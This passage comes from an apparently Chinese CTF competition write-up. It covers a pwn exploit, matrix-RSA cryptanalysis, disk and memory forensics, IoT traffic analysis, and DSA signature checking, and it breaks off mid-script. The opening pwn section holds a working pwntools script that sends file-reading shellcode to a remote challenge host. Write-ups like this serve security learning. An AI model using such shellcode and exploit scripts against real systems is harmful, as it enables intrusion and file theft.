class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">30794</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=asm(<span class="string">&#x27;&#x27;&#x27;    </span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, 3</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x100</span></span><br><span class="line"><span class="string">    push SYS_sendfile</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;MADE IN HEAVEN !!!!!!!!!!!!!!!!&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="matrixRSA"><a href="#matrixRSA" class="headerlink" title="matrixRSA"></a>matrixRSA</h2><p>题目实现了矩阵上的RSA，给出了p的高位以及加密后的矩阵，第一部分直接对p高位打copper，还原p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009</span></span><br><span class="line">p = <span class="number">9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275</span></span><br><span class="line"></span><br><span class="line">p = p&lt;&lt;<span class="number">100</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = p+x</span><br><span class="line">res = f.small_roots(X=<span class="number">2</span>^<span class="number">100</span>, beta=<span class="number">0.4</span>)</span><br><span class="line">p = <span class="built_in">int</span>(res[<span class="number">0</span>]) + p</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>到现在的话我们就顺利的分解了n，接下来需要求解私钥，矩阵上的RSA的phi和正常的不太一样，它的形式为</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154313929-1899459675.png" alt="image-20250303154309619"></p><p>那么接下来求解私钥然后对矩阵整体进行d次幂，然后遍历每行每列输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063</span></span><br><span class="line">n = <span class="number">132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009</span></span><br><span class="line">C = Matrix(Zmod(n), [</span><br><span class="line">    [<span class="number">130700952989014311434434028098810412089294728270156705618326733322297465714495704072159530618655340096705383710304658044991149662060657745933090473082775425812641300964472543605460360640675949447837208449794830578184968528547366608180085787382376536622136035364815331037493098283462540849880674541138443271941</span>,</span><br><span class="line">     <span class="number">71108771421281691064141020659106224750236412635914570166893031318860027728093402453305986361330527563506168063047627979831630830003190075818824767924892107148560048725155587353683119195901991465464478196049173060097561821877061015587704803006499153902855903286456023726638247758665778434728734461065079337757</span>,</span><br><span class="line">     <span class="number">67999998657112350704927993584783146575182096185020115836188544590466205688442741039622382576899587857972463337900200038021257164640987281308471100297698062626107380871262596623736773815445544153508352926374272336154553916204320257697068627063236060520725376727528604938949588845448940836430120015498687885615</span>],</span><br><span class="line">    [<span class="number">23893343854815011808020457237095285782125931083991537368666368653089096539223297567339111502968295914745423286070638369517207554770793304994639155083818859208362057394004419565231389473766857235749279110546079776040193183912062870294579472815588333047561915280189529367474392709554971446978468118280633281993</span>,</span><br><span class="line">     <span class="number">9711323829269829751519177755915164402658693668631868499383945203627197171508441332211907278473276713066275283973856513580205808517918096017699122954464305556795300874005627001464297760413897074044080665941802588680926430030715299713241442313300920463145903399054123967914968894345491958980945927764454159601</span>,</span><br><span class="line">     <span class="number">44904507975955275578858125671789564568591470104141872573541481508697254621798834910263012676346204850278744732796211742615531019931085695420000582627144871996018850098958417750918177991375489106531511894991744745328626887250694950153424439172667977623425955725695498585224383607063387876414273539268016177401</span>],</span><br><span class="line">    [<span class="number">67805732998935098446255672500407441801838056284635701147853683333480924477835278030145327818330916280792499177503535618310624546400536573924729837478349680007368781306805363621196573313903080315513952415535369016620873765493531188596985587834408434835281527678166509365418905214174034794683785063802543354572</span>,</span><br><span class="line">     <span class="number">13486048723056269216825615499052563411132892702727634833280269923882908676944418624902325737619945647093190397919828623788245644333036340084254490542292357044974139884304715033710988658109160936809398722070125690919829906642273377982021120160702344103998315875166038849942426382506293976662337161520494820727</span>,</span><br><span class="line">     <span class="number">95932690738697024519546289135992512776877884741458439242887603021792409575448192508456813215486904392440772808083658410285088451086298418303987628634150431725794904656250453314950126433260613949819432633322599879072805834951478466009343397728711205498602927752917834774516505262381463414617797291857077444676</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line">phi = (p^<span class="number">2</span> -<span class="number">1</span> )*(p^<span class="number">2</span>-p)*(q^<span class="number">2</span>-<span class="number">1</span>)*(q^<span class="number">2</span> - q)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">M = C ** d</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> M:</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> row:</span><br><span class="line">        flag += <span class="built_in">str</span>(long_to_bytes(<span class="built_in">int</span>(value)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="糟糕的磁盘"><a href="#糟糕的磁盘" class="headerlink" title="糟糕的磁盘"></a>糟糕的磁盘</h2><p>用取证大师进行取证，发现RAID-0</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154327149-1648019519.png" alt="image-20250303154323167"></p><p>加密的文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154331875-1070210975.png" alt="image-20250303154327980"></p><p>key是key.png</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154340469-492426724.png" alt="image-20250303154335594"></p><p>用veracrypt挂载</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154345249-966731448.png" alt="image-20250303154341278"></p><p>得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154349814-2057841595.png" alt="image-20250303154345984"></p><h1 id="IoT"><a href="#IoT" class="headerlink" title="IoT"></a>IoT</h1><h2 id="blink"><a href="#blink" class="headerlink" title="blink"></a>blink</h2><p>binwalk提不了，直接一坨放ida看了，esp的bin文件</p><p>看了很久的逻辑没找到关键逻辑，直接shift 12搜搜字符串，看到可疑字符串如下，交了即是flag</p><p>rtosandmorseisveryeasyhahhaha</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154356997-1326263203.png" alt="image-20250303154352848"></p><h2 id="sharkp"><a href="#sharkp" class="headerlink" title="sharkp"></a>sharkp</h2><p>分析流量发现接口大概确定是这下面两个</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154407709-566972928.png" alt="image-20250303154403877"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154412121-1475758605.png" alt="image-20250303154407995"></p><p>在后面又发现了可执行文件保存下来</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154417349-1788202840.png" alt="image-20250303154413349"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154423129-879773282.png" alt="image-20250303154418814"></p><p>丢尽沙箱（安恒沙箱真好用！！！）发现IP</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154429423-1382535449.png" alt="image-20250303154424949"></p><p>最后提交成功 <code>setConfigUpload_115.195.88.161</code></p><h1 id="DS"><a href="#DS" class="headerlink" title="DS"></a>DS</h1><h2 id="easydatalog"><a href="#easydatalog" class="headerlink" title="easydatalog"></a>easydatalog</h2><p>分析error.log，有上马的痕迹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154446106-1498889270.png" alt="image-20250303154442157"></p><p>这里有上传图片的痕迹，提取出来</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154451060-759323777.png" alt="image-20250303154446899"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154455225-372869484.png" alt="image-20250303154451067"></p><p>puzzlesolver一把梭，发现密码 <code>dataPersonPass123987</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154501215-361879772.png" alt="image-20250303154457085"></p><p>下面有上传zip的痕迹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154505841-1294426667.png" alt="image-20250303154501750"></p><p>拼接的zip，提出来</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154510048-447904192.png" alt="image-20250303154505902"></p><p>解压zip获得 <code>data.csv</code></p><p>但是乱码改成txt得到张三信息，即 <code>30601319731003117X_79159498824</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154515316-1604205721.png" alt="image-20250303154511212"></p><h2 id="DSASignatureData"><a href="#DSASignatureData" class="headerlink" title="DSASignatureData"></a>DSASignatureData</h2><p>本题目要求对数据进行验签，分析数据包，在数据包中是个人基础信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154524148-1242643115.png" alt="image-20250303154520184"></p><p>那就先提取数据，然后按照规定进行验证</p><p>先把多余的流量去掉，只保留传的json</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154530990-1283830734.png" alt="image-20250303154526899"></p><p>然后用tshark，提取用户信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r filter1.pcapng -T fields -e http.request.uri.query.parameter -e json.object -E separator=, &gt; extracted_data.txt</span><br></pre></td></tr></table></figure><p>然后整理得到这个csv</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154538186-557907021.png" alt="image-20250303154534134"></p><p>然后按照规则，验证签名，然后得到错误结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> DSS</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">public_keys = &#123;&#125;</span><br><span class="line">public_folder = <span class="string">&#x27;public&#x27;</span></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(public_folder):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.pem&#x27;</span>):</span><br><span class="line">        userid = filename[<span class="number">7</span>:<span class="number">11</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(public_folder, filename), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> key_file:</span><br><span class="line">            public_key = DSA.import_key(key_file.read())</span><br><span class="line">            public_keys[userid] = public_key</span><br><span class="line"></span><br><span class="line">sign_data_file = <span class="string">&#x27;data-sign.csv&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sign_data_file, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">    reader = csv.DictReader(csvfile)</span><br><span class="line">    altered_data = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        userid = row[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        name_signature = base64.b64decode(row[<span class="string">&#x27;name_signature&#x27;</span>])</span><br><span class="line">        idcard_signature = base64.b64decode(row[<span class="string">&#x27;idcard_signature&#x27;</span>])</span><br><span class="line">        phone_signature = base64.b64decode(row[<span class="string">&#x27;phone_signature&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        original_data_file = <span class="string">&#x27;extracted_data.csv&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(original_data_file, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>) <span class="keyword">as</span> original_csvfile:</span><br><span class="line">            original_reader = csv.DictReader(original_csvfile)</span><br><span class="line">            <span class="keyword">for</span> original_row <span class="keyword">in</span> original_reader:</span><br><span class="line">                <span class="keyword">if</span> original_row[<span class="string">&#x27;user&#x27;</span>] == userid:</span><br><span class="line">                    data_str = original_row[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">                    data_dict = json.loads(data_str.replace(<span class="string">&#x27;&quot;&quot;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>).replace(<span class="string">&#x27;\\&quot;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        name = data_dict[<span class="string">&#x27;name&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">        public_key = public_keys.get(userid.zfill(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> public_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            signer = DSS.new(public_key, <span class="string">&#x27;fips-186-3&#x27;</span>)</span><br><span class="line">            name_hash = SHA256.new(name.encode())</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                signer.verify(name_hash, name_signature)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 name 验证通过&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 name 验证失败&quot;</span>)</span><br><span class="line">                altered_data.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;userid&#x27;</span>: userid,</span><br><span class="line">                    <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">                    <span class="string">&#x27;idcard&#x27;</span>: data_dict[<span class="string">&#x27;idcard&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;phone&#x27;</span>: data_dict[<span class="string">&#x27;phone&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;error_field&#x27;</span>: <span class="string">&#x27;name&#x27;</span></span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            idcard_hash = SHA256.new(data_dict[<span class="string">&#x27;idcard&#x27;</span>].encode())</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                signer.verify(idcard_hash, idcard_signature)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 idcard 验证通过&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 idcard 验证失败&quot;</span>)</span><br><span class="line">                altered_data.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;userid&#x27;</span>: userid,</span><br><span class="line">                    <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">                    <span class="string">&#x27;idcard&#x27;</span>: data_dict[<span class="string">&#x27;idcard&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;phone&#x27;</span>: data_dict[<span class="string">&#x27;phone&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;error_field&#x27;</span>: <span class="string">&#x27;idcard&#x27;</span></span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            phone_hash = SHA256.new(data_dict[<span class="string">&#x27;phone&#x27;</span>].encode())</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                signer.verify(phone_hash, phone_signature)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 phone 验证通过&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 phone 验证失败&quot;</span>)</span><br><span class="line">                altered_data.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;userid&#x27;</span>: userid,</span><br><span class="line">                    <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">                    <span class="string">&#x27;idcard&#x27;</span>: data_dict[<span class="string">&#x27;idcard&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;phone&#x27;</span>: data_dict[<span class="string">&#x27;phone&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;error_field&#x27;</span>: <span class="string">&#x27;phone&#x27;</span></span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;未找到 <span class="subst">&#123;userid&#125;</span> 对应的公钥&quot;</span>)</span><br><span class="line"></span><br><span class="line">altered_file = <span class="string">&#x27;altered_data.csv&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(altered_file, <span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">    fieldnames = [<span class="string">&#x27;userid&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;idcard&#x27;</span>, <span class="string">&#x27;phone&#x27;</span>]</span><br><span class="line">    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)</span><br><span class="line">    writer.writeheader()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> altered_data:</span><br><span class="line">        writer.writerow(&#123;</span><br><span class="line">            <span class="string">&#x27;userid&#x27;</span>: row[<span class="string">&#x27;userid&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: row[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;idcard&#x27;</span>: row[<span class="string">&#x27;idcard&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;phone&#x27;</span>: row[<span class="string">&#x27;phone&#x27;</span>]</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>得到结果</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154548008-1029325857.png" alt="image-20250303154543898"></p><h2 id="easyrawencode"><a href="#easyrawencode" class="headerlink" title="easyrawencode"></a>easyrawencode</h2><p>附件是给raw，进行取证</p><p>发现了有对data.csv加密的过程</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154600208-1219564800.png" alt="image-20250303154556229"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154605461-737943410.png" alt="image-20250303154601264"></p><p>所用到的私钥</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154611496-176615729.png" alt="image-20250303154607584"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154616444-716431259.png" alt="image-20250303154612070"></p><p>查看注册表，找到<code>hackkey</code>的值</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154623214-908780775.png" alt="image-20250303154619153"></p><p>查看console的执行过程，发现有执行结果</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154628433-1202187935.png" alt="image-20250303154624437"></p><p>分析脚本，用的AES对内容进行的加密，那就编写脚本对其进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">enckey = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;20d96098010eb9b326be6c46e1ce1ca679e29f1d65dec055cf8c46c6436c3356af2dc312b2d35466308b9fff0dd427b44a37e34fca12992e45db2ddd81884bd8eb5bccd3c595e8a9a352bd61322e1d52329d6c8638bbfce65edffbc4d3a5759e88c0f90e31ce518837552a3a09d8e7e3c374f3857bfe501cce2066fb233ff1f5faac18d73c3b665a54e8c55574f16bf4678c5ce835d2a14a65f8c1cec012435a8c06314cbe727a3a9b6060dfd6cdb850073423841178f6f409bb7ce8d4863c6f58855954d34af3d2964c488c9057c8c5072a54e43f1f8039d32409eb1ff3abca41c0b302788c4c56c1a4be4506ff5b8aff0242e21c0ee7ffee2da20ed9434334&quot;</span>)</span><br><span class="line">nonce = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;d919c229aab6535efa09a52c589c8f47&quot;</span>)</span><br><span class="line">tag = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;5b204675b1b173c32c04b0b8a100ee29&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取私钥</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pri.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pri_key = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取加密数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;encrypted_data.bin&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    enc_data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用RSA私钥解密AES密钥</span></span><br><span class="line">de_rsa = PKCS1_OAEP.new(pri_key)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    aes_key_decrypted = de_rsa.decrypt(enckey)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RSA解密AES密钥失败：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用解密后的AES密钥解密文件数据</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    de_aes = 